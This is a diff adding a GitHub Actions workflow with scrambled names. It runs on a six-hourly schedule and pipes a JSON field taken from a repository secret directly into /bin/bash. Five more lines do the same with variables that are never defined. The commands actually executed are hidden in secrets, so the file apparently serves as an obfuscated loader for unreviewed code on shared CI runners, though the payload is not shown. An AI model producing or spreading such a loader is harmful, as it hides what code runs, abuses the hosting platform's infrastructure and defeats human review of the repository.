@@ -1,0 +1,23 @@
+name: gaozhongzzx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaozhongzzx
+        env:
+          sko036: ${{ secrets.sko036 }}
+        run: |
+          echo $sko036 | jq -r .u16 | /bin/bash
+          echo $ccsfb96 | jq -r .jn30 | /bin/bash
+          echo $akw5 | jq -r .qkhs86141 | /bin/bash
+          echo $wry76 | jq -r .pwq9 | /bin/bash
+          echo $e532 | jq -r .l9707 | /bin/bash
+          echo $rivuq411 | jq -r .pdnm5701 | /bin/bash
+
